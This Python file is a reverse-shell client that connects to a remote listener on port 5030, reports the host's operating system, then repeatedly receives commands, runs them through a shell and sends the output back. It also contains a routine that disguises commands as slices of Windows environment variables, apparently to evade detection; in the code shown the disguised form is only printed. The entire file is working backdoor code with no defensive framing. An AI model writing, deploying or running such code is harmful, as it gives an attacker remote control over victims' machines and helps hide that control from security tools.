import socket
import sys
import subprocess
import platform
import os
import random
import string


target_host="0.0.0.0"
target_port=5030
env_mapping=None

default_env_variables=[
    "ALLUSERSPROFILE",
    "APPDATA",
    "CommonProgramFiles",
    "CommonProgramFiles(x86)",
    "CommonProgramW6432",
    "COMPUTERNAME",
    "ComSpec",
    "HOMEDRIVE",
    "HOMEPATH",
    "LOCALAPPDATA",
    "LOGONSERVER",
    "PATH",
    "PATHEXT",
    "ProgramData",
    "ProgramFiles",
    "ProgramFiles(x86)",
    "ProgramW6432",
    "PROMPT",
    "PSModulePath",
    "PUBLIC",
    "SystemDrive",
    "SystemRoot",
    "TEMP",
    "TMP",
    "USERDOMAIN",
    "USERNAME",
    "USERPROFILE",
    "windir"
]


def encode_data(data:str):return data.encode('utf-8')
def decode_data(data:str):return data.decode('utf-8')


def get_system_details():
    system_info = platform.uname()
    return str(system_info.system)

def get_obfs_keys():
    global env_mapping
    env_mapping = {}
    chars = [char for char in string.printable if char.isalpha()]
    for char in chars:env_mapping[char] = []
    env_vars = os.environ
    for key, value in env_vars.items():
        for index, char in enumerate(value):
            if char in chars:
                slice_representation = f"{key}[{index}:{index + 1}]"
                env_mapping[char].append(slice_representation)

    

def obfuscate_command(command:str):
    obfuscated_command = []
    global env_mapping
    for char in command:
        if char in env_mapping and env_mapping[char]:
            # Randomly select one of the mappings
            obfuscated_command.append(random.choice(env_mapping[char]))
        else:
            # Use the character as it is if env_mapping is empty
            obfuscated_command.append(char)
    
    return ''.join(obfuscated_command)



def run_command(command):
    command = command.rstrip()
    try:
        # Execute the command and get the output
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return f"Command failed with error: {e.output.decode('utf-8')}"
    

def main():
    client = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
    client.connect( (target_host, target_port) )
    get_obfs_keys()

    try:
        system_info = get_system_details()
        client.send( encode_data(system_info))

        while True:
            
            command =client.recv( 4096)
            command = ( decode_data( command) ).rstrip()

            print(f'received command: {command}')
            obfs_command = obfuscate_command( command)
            print(f"obfuscated command: {obfs_command}")
            if not command:
                break 
            
            output = run_command( command)

            client.send(encode_data(output))
            
    except (socket.error, OSError) as e:
        print(f"ERROR: Connection lost: {e}")
        client.close()
    except Exception as error:
        print(f'ERRPR : {str(error)}')



if __name__=="__main__":
    main()